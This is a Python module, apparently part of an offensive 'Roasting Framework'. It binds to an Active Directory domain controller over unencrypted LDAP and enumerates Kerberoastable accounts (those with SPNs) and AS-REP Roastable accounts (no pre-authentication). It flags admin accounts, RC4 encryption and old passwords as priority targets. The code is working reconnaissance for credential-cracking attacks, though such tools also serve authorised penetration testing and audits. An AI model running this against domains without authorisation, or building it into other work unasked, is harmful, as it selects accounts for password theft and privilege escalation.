"""
LDAP Enumeration — Phase 1 of the Roasting Framework.

Handles connection to the Domain Controller and discovery of
Kerberoastable and AS-REP Roastable accounts via LDAP queries.
"""

import sys
from datetime import datetime
from typing import List, Optional, Tuple

try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
except ImportError:
    print("[!] ldap3 required: pip install ldap3")
    sys.exit(1)

from ..core.target import RoastingTarget


class LDAPEnumerator:
    """Enumerates roastable accounts from Active Directory via LDAP."""

    # LDAP filter components
    _USER_BASE = "(objectClass=user)(objectCategory=person)"
    _NOT_DISABLED = "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
    _HAS_SPN = "(servicePrincipalName=*)"
    # DONT_REQ_PREAUTH = 0x400000
    _NO_PREAUTH = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

    _KERBEROAST_ATTRS = [
        "sAMAccountName", "servicePrincipalName", "adminCount",
        "memberOf", "description", "pwdLastSet", "lastLogon",
        "userAccountControl", "distinguishedName",
    ]

    _ASREP_ATTRS = [
        "sAMAccountName", "adminCount", "memberOf",
        "description", "pwdLastSet", "userAccountControl",
    ]

    def __init__(self, domain: str, username: str, password: str, dc_ip: str):
        self.domain = domain
        self.username = username
        self.password = password
        self.dc_ip = dc_ip
        self.base_dn = ",".join(f"DC={part}" for part in domain.split("."))
        self.conn: Optional[Connection] = None

    def connect(self) -> bool:
        """Establish LDAP connection to the Domain Controller."""
        print(f"\n{'=' * 60}")
        print("PHASE 1: LDAP ENUMERATION")
        print(f"{'=' * 60}")

        try:
            server = Server(self.dc_ip, get_info=ALL, use_ssl=False)
            user_dn = f"{self.domain}\\{self.username}"

            print(f"[*] Connecting to {self.dc_ip} as {user_dn}")

            self.conn = Connection(
                server,
                user=user_dn,
                password=self.password,
                authentication=NTLM,
                auto_bind=True,
            )

            print("[+] LDAP connection established")
            return True
        except Exception as e:
            print(f"[-] LDAP connection failed: {e}")
            return False

    def enumerate_kerberoastable(self) -> List[RoastingTarget]:
        """Find all user accounts with SPNs (Kerberoastable)."""
        print("\n[*] Enumerating Kerberoastable Accounts...")

        targets: List[RoastingTarget] = []

        try:
            ldap_filter = (
                f"(&{self._USER_BASE}{self._HAS_SPN}{self._NOT_DISABLED})"
            )
            self.conn.search(
                search_base=self.base_dn,
                search_filter=ldap_filter,
                search_scope=SUBTREE,
                attributes=self._KERBEROAST_ATTRS,
            )

            for entry in self.conn.entries:
                username = str(entry.sAMAccountName)
                spns = [str(s) for s in entry.servicePrincipalName]
                is_admin = str(entry.get("adminCount", 0)) == "1"
                description = str(entry.get("description", ""))
                pwd_last_set = str(entry.get("pwdLastSet", ""))
                uac = int(str(entry.get("userAccountControl", 0)))

                target = RoastingTarget(
                    username=username, domain=self.domain, spns=spns,
                    is_admin=is_admin, description=description,
                    pwd_last_set=pwd_last_set, roast_type="kerberoast",
                )
                targets.append(target)

                enc_type = "AES256" if uac & 0x08000000 else "RC4"

                print(f"    {target.priority_icon} {username}")
                print(f"       SPN: {spns[0]}")
                print(f"       Admin: {'YES' if is_admin else 'No'} | Encryption: {enc_type}")
                print(f"       Pwd Last Set: {pwd_last_set}")
                if description and description != "[]":
                    print(f"       Description: {description}")

            self._print_kerberoast_summary(targets)

        except Exception as e:
            print(f"[-] Kerberoastable enumeration failed: {e}")

        return targets

    def enumerate_asreproastable(self) -> List[RoastingTarget]:
        """Find accounts without Kerberos pre-authentication required."""
        print("\n[*] Enumerating AS-REP Roastable Accounts...")

        targets: List[RoastingTarget] = []

        try:
            ldap_filter = (
                f"(&{self._USER_BASE}{self._NO_PREAUTH}{self._NOT_DISABLED})"
            )
            self.conn.search(
                search_base=self.base_dn,
                search_filter=ldap_filter,
                search_scope=SUBTREE,
                attributes=self._ASREP_ATTRS,
            )

            for entry in self.conn.entries:
                username = str(entry.sAMAccountName)
                is_admin = str(entry.get("adminCount", 0)) == "1"
                description = str(entry.get("description", ""))
                pwd_last_set = str(entry.get("pwdLastSet", ""))

                target = RoastingTarget(
                    username=username, domain=self.domain,
                    is_admin=is_admin, description=description,
                    pwd_last_set=pwd_last_set, roast_type="asreproast",
                )
                targets.append(target)

                print(f"    {target.priority_icon} {username}")
                print(f"       Admin: {'YES' if is_admin else 'No'}")
                print(f"       Pwd Last Set: {pwd_last_set}")

            print(f"\n[+] Found {len(targets)} AS-REP Roastable accounts")

        except Exception as e:
            print(f"[-] AS-REP Roastable enumeration failed: {e}")

        return targets

    @staticmethod
    def _print_kerberoast_summary(targets: List[RoastingTarget]):
        critical = sum(1 for t in targets if t.priority == "CRITICAL")
        high = sum(1 for t in targets if t.priority == "HIGH")
        medium = len(targets) - critical - high

        print(f"\n[+] Found {len(targets)} Kerberoastable accounts")
        print(f"    🔴 CRITICAL (adminCount=1): {critical}")
        print(f"    🟡 HIGH (keywords match): {high}")
        print(f"    🟢 MEDIUM: {medium}")